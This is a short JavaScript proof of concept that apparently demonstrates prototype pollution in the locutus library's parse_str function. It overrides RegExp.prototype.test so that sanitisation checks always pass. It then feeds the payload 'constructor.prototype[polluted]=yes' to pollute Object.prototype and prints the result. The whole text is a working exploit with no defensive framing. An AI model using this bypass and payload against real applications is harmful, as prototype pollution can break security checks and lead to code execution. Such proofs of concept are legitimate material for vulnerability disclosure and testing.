RegExp.prototype.test = () => true;
console.log({}.polluted);
const locutus = require('locutus');
locutus.php.strings.parse_str('constructor.prototype[polluted]=yes');
console.log({}.polluted);